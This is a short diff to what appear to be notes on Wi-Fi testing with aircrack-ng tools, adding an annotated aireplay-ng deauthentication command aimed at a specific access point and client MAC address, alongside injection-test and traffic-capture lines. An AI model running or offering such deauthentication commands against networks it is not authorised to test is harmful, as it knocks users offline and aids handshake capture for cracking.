@@ -74,6 +74,11 @@ sudo aireplay-ng --test wlan0mon
 # check traffic
 sudo airodump-ng wlan0mon
 
+# perform deauthentication 
+# -0 > deauthentication
+# 5 > number of deauths to send (0 = send continuously)
+# -a > access point -c > client (MAC)
+sudo aireplay-ng -0 5 -a 00:14:6C:7A:41:81 -c 00:0F:B5:32:31:31 wlan0mon
 
 
 
